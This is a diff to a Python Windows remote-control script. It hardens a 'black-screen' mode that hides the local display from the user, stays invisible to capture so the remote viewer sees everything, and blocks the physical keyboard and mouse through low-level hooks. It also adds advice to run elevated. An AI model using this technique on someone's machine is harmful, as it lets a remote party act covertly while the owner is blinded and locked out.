@@ -119,12 +119,24 @@ pyautogui.PAUSE = 0         # pyautogui defaults to a 0.1s sleep after EVERY cal
 #     the process as a last resort.
 #
 # Requires Windows 10 build 2004 (May 2020 Update) or later for the display-
-# affinity trick; on older Windows the overlay still blanks/blocks input,
-# but the remote stream would go black too (a warning is logged if it fails).
+# affinity trick, AND requires this process to be running elevated (as
+# Administrator) — both SetWindowsHookExW and SetWindowDisplayAffinity fail
+# silently (return FALSE, no exception) when run as a normal user, which
+# shows up as: physical keyboard/mouse still working, and/or the remote
+# stream going black too instead of showing through. Run the script (or the
+# built .exe) as Administrator, or build with `pyinstaller --uac-admin` so
+# it always requests elevation automatically.
 # ---------------------------------------------------------------------------
 
-user32 = ctypes.windll.user32
-kernel32 = ctypes.windll.kernel32
+user32 = ctypes.WinDLL("user32", use_last_error=True)
+kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+
+
+def is_admin():
+    try:
+        return bool(ctypes.windll.shell32.IsUserAnAdmin())
+    except Exception:
+        return False
 
 WH_KEYBOARD_LL = 13
 WH_MOUSE_LL = 14
@@ -202,8 +214,22 @@ _mouse_proc_ref = LowLevelProc(_mouse_hook_proc)      # GC'd callbacks would cra
 
 def _install_hooks():
     hmod = kernel32.GetModuleHandleW(None)
+
+    ctypes.set_last_error(0)
     _hook_handles["kb"] = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _kb_proc_ref, hmod, 0)
+    if not _hook_handles["kb"]:
+        err = ctypes.get_last_error()
+        print(f"[-] Keyboard hook FAILED to install (error {err}: {ctypes.FormatError(err)}). "
+              f"Physical keyboard will NOT be blocked. "
+              f"{'' if is_admin() else 'Try running as Administrator.'}")
+
+    ctypes.set_last_error(0)
     _hook_handles["mouse"] = user32.SetWindowsHookExW(WH_MOUSE_LL, _mouse_proc_ref, hmod, 0)
+    if not _hook_handles["mouse"]:
+        err = ctypes.get_last_error()
+        print(f"[-] Mouse hook FAILED to install (error {err}: {ctypes.FormatError(err)}). "
+              f"Physical mouse will NOT be blocked. "
+              f"{'' if is_admin() else 'Try running as Administrator.'}")
 
 
 def _uninstall_hooks():
@@ -222,10 +248,19 @@ def _show_blackscreen(root):
     sw, sh = win.winfo_screenwidth(), win.winfo_screenheight()
     win.geometry(f"{sw}x{sh}+0+0")
     win.update_idletasks()
-    try:
-        user32.SetWindowDisplayAffinity(wintypes.HWND(win.winfo_id()), WDA_EXCLUDEFROMCAPTURE)
-    except Exception as e:
-        print(f"[-] SetWindowDisplayAffinity failed (needs Windows 10 2004+): {e}")
+
+    if not is_admin():
+        print("[-] Not running as Administrator — the black-screen hooks/display-affinity "
+              "below are likely to fail silently. Re-run elevated for this feature to work.")
+
+    ctypes.set_last_error(0)
+    ok = user32.SetWindowDisplayAffinity(wintypes.HWND(win.winfo_id()), WDA_EXCLUDEFROMCAPTURE)
+    if not ok:
+        err = ctypes.get_last_error()
+        print(f"[-] SetWindowDisplayAffinity FAILED (error {err}: {ctypes.FormatError(err)}). "
+              f"The remote view will show black too instead of the real screen. "
+              f"Needs Windows 10 build 2004+ AND Administrator privileges.")
+
     blackscreen_state["window"] = win
     _install_hooks()
     blackscreen_state["active"] = True
